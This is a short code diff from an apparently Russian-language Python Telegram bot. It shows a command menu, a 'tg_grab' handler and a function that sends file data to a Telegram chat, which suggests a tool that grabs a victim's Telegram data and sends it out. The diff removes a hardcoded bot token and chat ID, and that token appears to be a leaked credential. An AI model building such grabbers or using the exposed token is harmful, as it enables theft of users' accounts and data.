@@ -285,8 +285,6 @@ def start(message):
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 @bot.message_handler(commands=['tg_grab'])
-telegram_bot_token = "7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8"  # Замените на ваш токен
-chat_id = 1882056354  # Замените на ваш Chat ID
 
 def send_file_to_telegram(file_data):
     global telegram_bot_token, chat_id
